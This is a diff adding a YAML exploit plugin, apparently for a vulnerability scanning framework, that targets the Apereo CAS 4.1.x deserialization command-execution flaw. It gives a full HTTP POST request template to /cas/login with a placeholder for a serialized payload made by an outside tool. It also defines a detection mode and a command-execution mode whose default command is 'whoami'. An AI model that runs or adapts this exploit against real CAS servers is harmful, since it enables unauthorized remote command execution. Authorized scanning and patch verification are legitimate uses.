@@ -1,0 +1,42 @@
+info:
+    app: ApereoCAS
+    name: Deserialize
+    author: 小晨曦
+    plugin_version: 1.0.0
+    disclosure_date: "2022-07-17"
+    create_date: "2024-10-06 06:25:31"
+    update_date: "2024-10-06 06:25:31"
+    scope: Apereo CAS 4.1.X ~ 4.1.6
+    description: Apereo CAS 4.1 反序列化命令执行漏洞
+    detail: 获取信息：无损检测漏洞是否存在。
+    payload: |-
+        POST /cas/login HTTP/1.1
+        Host: your-ip
+        Content-Length: 2287
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        Origin: http://your-ip:8080
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Referer: http://your-ip:8080/cas/login
+        Accept-Encoding: gzip, deflate
+        Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
+        Cookie: JSESSIONID=24FB4BAAE1A66E8B76D521EE366B3E12; _ga=GA1.1.1139210877.1586367734
+        Connection: close
+
+        username=test&password=test&lt=LT-2-gs2epe7hUYofoq0gI21Cf6WZqMiJyj-cas01.example.org&execution=[payload]&_eventId=submit&submit=LOGIN
+        [payload]替换为p牛工具生成的。
+    reference: https://github.com/vulhub/vulhub/blob/master/apereo-cas/4.1-rce/README.zh-cn.md
+    vul_type: 命令执行
+payloads:
+    - name: getmsg1
+      alias: 检测漏洞
+    - name: cmd1
+      alias: 命令执行
+      params:
+          - key: cmd
+            title: 命令
+            param_type: edit
+            default_value: whoami
+            required: true
